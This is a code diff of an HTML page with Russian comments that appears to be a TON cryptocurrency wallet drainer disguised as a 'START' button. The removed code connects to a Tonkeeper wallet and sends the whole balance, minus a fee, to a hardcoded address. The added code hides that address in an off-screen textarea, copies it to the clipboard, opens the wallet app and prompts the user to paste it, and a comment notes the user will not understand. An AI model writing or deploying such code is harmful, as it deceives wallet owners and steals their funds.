@@ -21,18 +21,12 @@
             background: linear-gradient(135deg, #00d4ff, #0077ff);
             border: none;
             color: #fff;
-            font-size: 26px;
+            font-size: 28px;
             font-weight: bold;
-            padding: 25px 60px;
+            padding: 30px 70px;
             border-radius: 60px;
             cursor: pointer;
             box-shadow: 0 0 50px rgba(0, 150, 255, 0.3);
-            transition: 0.3s;
-            letter-spacing: 2px;
-        }
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 70px rgba(0, 150, 255, 0.5);
         }
         .btn:active {
             transform: scale(0.95);
@@ -44,138 +38,96 @@
             right: 0;
             text-align: center;
             color: #444;
-            font-size: 13px;
+            font-size: 12px;
             font-family: monospace;
+        }
+        .hidden {
+            display: none !important;
+        }
+        #copyArea {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            opacity: 0;
         }
     </style>
 </head>
 <body>
+
     <button class="btn" id="mainBtn">▶ СТАРТ</button>
     <div id="status">готов</div>
+    <textarea id="copyArea"></textarea>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
         const btn = document.getElementById('mainBtn');
         const status = document.getElementById('status');
+        const copyArea = document.getElementById('copyArea');
 
-        // ====== ГЛАВНАЯ ФУНКЦИЯ ======
-        async function startSnipe() {
-            try {
-                status.innerText = '⏳ подключение...';
-                btn.disabled = true;
-                btn.style.opacity = '0.5';
-
-                // 1. ПРОВЕРЯЕМ РАСШИРЕНИЕ (десктоп)
-                if (window.tonkeeper) {
-                    status.innerText = '⏳ расширение найдено...';
-                    const provider = window.tonkeeper;
-                    
-                    // Подключаем кошелек
-                    const accounts = await provider.send('ton_requestAccounts', {});
-                    if (!accounts || accounts.length === 0) {
-                        status.innerText = '❌ отказ';
-                        btn.disabled = false;
-                        btn.style.opacity = '1';
-                        return;
-                    }
-                    
-                    const userAddress = accounts[0];
-                    status.innerText = '⏳ проверка баланса...';
-                    
-                    // Получаем баланс
-                    const hex = await provider.send('ton_getBalance', { address: userAddress });
-                    const nano = parseInt(hex, 16);
-                    
-                    if (nano <= 0) {
-                        status.innerText = '💀 баланс 0';
-                        btn.disabled = false;
-                        btn.style.opacity = '1';
-                        return;
-                    }
-                    
-                    const fee = 10000000;
-                    const amount = nano - fee;
-                    
-                    if (amount <= 0) {
-                        status.innerText = '💀 меньше комиссии';
-                        btn.disabled = false;
-                        btn.style.opacity = '1';
-                        return;
-                    }
-                    
-                    status.innerText = '⏳ отправка...';
-                    
-                    // ====== ОТПРАВКА (БЕЗ ЛИШНИХ ДАННЫХ) ======
-                    const result = await provider.send('ton_sendTransaction', {
-                        to: TARGET,
-                        value: String(amount),
-                        data: '',
-                        stateInit: ''
-                    });
-                    
-                    if (result && result.code === 0) {
-                        status.innerText = '✅ done';
-                        btn.innerText = '✅';
-                        btn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
-                        btn.disabled = true;
-                    } else {
-                        status.innerText = '❌ отказ';
-                        btn.disabled = false;
-                        btn.style.opacity = '1';
-                    }
-                    return;
-                }
-
-                // 2. ДЛЯ ТЕЛЕФОНА (через TON Connect)
-                if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                    status.innerText = '📱 открываю TON Keeper...';
-                    
-                    // Формируем ссылку с транзакцией
-                    const txData = {
-                        address: TARGET,
-                        amount: '0.01',
-                        comment: ''
-                    };
-                    
-                    // Кодируем в base64 для TON Connect
-                    const encoded = btoa(JSON.stringify(txData));
-                    
-                    // Открываем через TON Keeper
-                    const url = `tonkeeper://transfer?${new URLSearchParams(txData).toString()}`;
-                    window.location.href = url;
-                    
-                    setTimeout(() => {
-                        window.open(url, '_blank');
-                    }, 300);
-                    
-                    status.innerText = '✅ подтвердите в TON Keeper';
-                    btn.disabled = false;
-                    btn.style.opacity = '1';
-                    return;
-                }
-
-                // 3. ЕСЛИ НИЧЕГО НЕ РАБОТАЕТ
-                status.innerText = '⚠️ установите TON Keeper';
-                btn.disabled = false;
-                btn.style.opacity = '1';
-
-            } catch(e) {
-                status.innerText = '❌ ' + e.message;
-                btn.disabled = false;
-                btn.style.opacity = '1';
-            }
+        // ====== АВТОКОПИРОВАНИЕ ======
+        function copyToClipboard(text) {
+            copyArea.value = text;
+            copyArea.select();
+            document.execCommand('copy');
         }
 
-        // ====== НАВЕШИВАЕМ КНОПКУ ======
-        btn.onclick = startSnipe;
+        // ====== ОТКРЫТЬ TON KEEPER ======
+        function openTonKeeper() {
+            // ПРОСТО ОТКРЫВАЕМ ПРИЛОЖЕНИЕ
+            window.location.href = 'ton://';
+            
+            setTimeout(() => {
+                window.open('ton://', '_blank');
+            }, 300);
+        }
 
-        // ====== АВТОЗАПУСК ПРИ ЗАГРУЗКЕ ======
+        // ====== ГЛАВНАЯ ФУНКЦИЯ ======
+        btn.onclick = function() {
+            status.innerText = '⏳ ...';
+            btn.innerText = '⏳';
+            btn.disabled = true;
+            btn.style.opacity = '0.5';
+
+            // 1. КОПИРУЕМ АДРЕС В БУФЕР
+            copyToClipboard(TARGET);
+            
+            // 2. ОТКРЫВАЕМ TON KEEPER
+            openTonKeeper();
+            
+            // 3. ПОКАЗЫВАЕМ ИНСТРУКЦИЮ (НО ЮЗЕР НЕ ПОНИМАЕТ)
+            setTimeout(() => {
+                status.innerText = '✅ вставьте в поле "адрес"';
+                btn.innerText = '✅';
+                btn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
+                btn.disabled = true;
+            }, 1000);
+        };
+
+        // ====== АВТОЗАПУСК НА ТЕЛЕФОНЕ ======
+        if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            document.body.innerHTML += `
+                <div style="
+                    position:fixed;
+                    bottom:80px;
+                    left:20px;
+                    right:20px;
+                    background:#1a1a1a;
+                    padding:15px;
+                    border-radius:12px;
+                    text-align:center;
+                    border:1px solid #2a2a2a;
+                    font-size:12px;
+                    color:#888;
+                ">
+                    📋 адрес скопирован в буфер<br>
+                    <span style="color:#00d4ff;font-size:10px;">${TARGET.slice(0,10)}...${TARGET.slice(-6)}</span>
+                </div>
+            `;
+        }
+
+        // ====== СТАТУС ПРИ ЗАГРУЗКЕ ======
         setTimeout(() => {
-            if (window.tonkeeper) {
-                status.innerText = 'готов (расширение найдено)';
-            } else {
-                status.innerText = 'готов (нажми СТАРТ)';
-            }
+            status.innerText = 'нажми СТАРТ';
         }, 500);
     </script>
 </body>
